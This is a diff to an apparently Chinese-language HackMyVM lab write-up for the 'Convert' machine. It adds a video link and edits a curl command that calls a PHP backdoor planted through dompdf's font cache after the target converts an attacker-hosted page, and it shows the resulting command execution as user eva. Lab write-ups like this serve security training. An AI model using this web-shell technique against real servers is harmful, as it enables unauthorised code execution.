@@ -2,6 +2,8 @@
 
 2024.12.28 https://hackmyvm.eu/machines/machine.php?vm=Convert
 
+[video](https://www.bilibili.com/video/BV1PqQVY2Ega/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
+
 ## Ip
 
 192.168.5.40
@@ -83,7 +85,7 @@ f776a221d3d01869caf352500f07dfe4
 然后对这个 url 进行 pdf 转换： http://192.168.5.3:9001/index.html ，然后在访问写入的后门链接：
 
 ```
-curl http://192.168.5.40/dompdf/lib/fonts/exploitfont_normal_f776a221d3d01869caf352500f07dfe4.php?1=id
+curl --output - http://192.168.5.40/dompdf/lib/fonts/exploitfont_normal_f776a221d3d01869caf352500f07dfe4.php?1=id
 
 uid=1000(eva) gid=1000(eva) groups=1000(eva)
 ```
